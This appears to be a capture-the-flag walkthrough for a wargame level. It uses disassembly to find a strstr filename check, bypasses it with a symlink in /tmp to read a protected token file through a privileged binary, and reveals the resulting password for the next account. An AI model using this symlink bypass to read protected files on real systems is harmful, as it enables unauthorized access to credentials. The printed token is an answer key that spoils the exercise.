Once again, there is a binary executed with the rights we want.
There is also a file named token, on which we have, of course, no rights.

(in <main>)

80485af:	c7 44 24 04 93 87 04 	mov    DWORD PTR [esp+0x4],0x8048793
80485b6:	08
80485b7:	89 04 24             	mov    DWORD PTR [esp],eax
80485ba:	e8 41 fe ff ff       	call   8048400 <strstr@plt>

$>gdb
(gdb)$> x/s 0x8048793

0x8048793:	 "token"

A quick look at the level08 binary objdump teaches us that it needs an argument, 
which it will open and read. Of course, there is a catch, your argument, thus the
file you want to read, must not contain the substring "token" (strstr is called).

Once again, we can use tmp.

$> cd /tmp
$> ln -s /home/user/level08/token ./exploit
$> /home/user/level08/level08 exploit
$> su flag08
$> quif5eloekouj29ke0vouxean
$> getflag

We can now get the next flag.
